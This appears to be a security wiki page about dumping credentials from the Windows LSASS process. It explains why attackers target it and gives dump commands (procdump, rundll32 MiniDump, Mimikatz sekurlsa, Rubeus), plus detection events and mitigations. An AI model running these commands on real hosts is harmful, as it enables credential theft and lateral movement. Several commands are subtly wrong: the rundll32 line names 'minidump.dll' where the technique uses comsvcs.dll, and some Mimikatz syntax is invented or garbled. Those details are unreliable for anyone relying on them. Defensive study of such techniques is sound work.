---
title: LSASS (Local Security Authority Subsystem Service)
type: concept
created: 2026-09-06
updated: 2026-09-06
tags: [windows, credential-access, lsass, post-exploitation]
---

# LSASS (Local Security Authority Subsystem Service)

`lsass.exe` is the Windows process that **holds credentials in memory** for
active logons: NTLM hashes, Kerberos TGTs/TGSs, plaintext passwords (for some
protocols), DPAPI master keys, and certificate private keys. Dumping LSASS
memory is the canonical online way to steal credentials on a compromised
host — it's what produces the hashes you feed to [[pass-the-hash-and-ticket|PtH/PtT]]
and the tickets for [[pass-the-hash-and-ticket|PtT]].

## Why it's targeted

- It has **everything for the current logon session** in memory, including
  secrets not otherwise on disk: the live Kerberos TGT, the NTLM hash, and
  (for interactive logons) sometimes the plaintext.
- A dump gives you the keys for [[pass-the-key]] (AES/RC4) and the hashes for
  PtH, plus DPAPI master keys for decrypting browser/credential stores.

## Dump methods

```powershell
# procdump (Sysinternals) — full LSASS dump
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# comsvcs / com+ MiniDump (classic "com kill") — via the IMiniDump COM interface
#   (minidump from a running process without the -ma flag surface)

# Taskmgr / rundll32 comsvcs,MiniDump (legacy in-memory dump)
rundll32.exe C:\Windows\System32\minidump.dll,MiniDump <lsass-pid> C:\temp\lsass.dmp full
```

```
# Mimikatz — parse the dump (or dump live)
privilege::debug
sekurlsa::logonpasswords          # live: list hashes, keys, tickets for all logons
sekurlsa::dump /analyze           # or open a saved dump:
sekurlsa::logonpasswords /dump:lsass.dmp
```

```bash
# gsecdump / secretsdump for the LSA secrets portion (system/ntds)
# Rubeus triage on a host reads the current user's Kerberos tickets directly:
Rubeus.exe triage
```

## What you get

- **NTLM hashes** → [[pass-the-hash-and-ticket|PtH]], offline cracking.
- **Kerberos TGT/TGS** → [[pass-the-hash-and-ticket|PtT]] (export with
  `Rubeus.exe dump` or `sekurlsa::tickets /export`).
- **AES/RC4 keys** → [[pass-the-key|PtK]].
- **Plaintext** (interactive, some protocols) — the jackpot.
- **DPAPI master keys / certificates** — decrypt stored creds ([[dpapi]]).

## Detection

- **Sysmon Event 10** (Process Access) — a non-system process (especially
  `svchost`, `conhost`, or an attacker binary) opening `lsass.exe` with
  `PROCESS_VM_READ` (`0x10`) is the high-fidelity tell. Sysmon is the
  telemetry source ([[sysmon]]); the rule that fires on it is a Sigma
  detection ([[sigma]]).
- **Event 4688** with a command line containing `procdump`/`-ma lsass` /
  `MiniDump`.
- A new `lsass.dmp` file written to disk (4663 / 11 file creation).
- LSASS handle opens with unusual access masks.

## Mitigations

- **Credential Guard** — runs LSASS in a VBS-enclave; a normal (non-VBS)
  dump reads zeros, not secrets. The primary defense.
- **LSASS PPL (Protected Process Light)** — raises the bar for dumping
  (need a PPL-protected or elevated dumper).
- **RunAs / token filtering** — limit which processes can open LSASS.
- **Sysmon 10 tuning** — alert on LSASS access from non-baseline processes.
- [[ad-tiering-and-hardening]] — keep low-trust hosts from holding Tier-0
  creds in LSASS in the first place.

## Links

- [[credential-dumping]] — the on-host secret stores map (LSASS is the online one)
- [[pass-the-hash-and-ticket|PtH/PtT]] — the techniques a dump feeds
- [[pass-the-key|PtK]] — the AES/RC4 keys in the dump
- [[ntds-dit]] — the AD-side analog (domain creds, not host creds)
- [[sam-database]] — the local account store (on-disk, not in-memory)
- [[ad-cs-esc-attacks]] — cert private keys can also live in LSASS
- [[ad-tiering-and-hardening]] — Credential Guard / PPL mitigations
- [[skeleton-key]] — the in-memory LSASS patch on a DC (Skeleton Key persistence)
- [[gmsa]] — gMSA keys are cached here on the *host* running the service (a dump target)
- [[process-injection]] — dumping LSASS from *another* process's context (hollowing/stomping into a dumper)
- [[meterpreter]] — the payload that runs the live `sekurlsa`-equivalent dump
- [[defense-evasion-ad]] — the EDR/AMSI/ETW surface a live dump lands in

## References

- [ired.team: LSASS dump](https://www.ired.team/offensive-security-experiments/post-exploitation/lsass-dump)
- [Mimikatz documentation](https://mimikatz-project.github.io/)
- [Sysmon Event 10 (LSASS access)](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
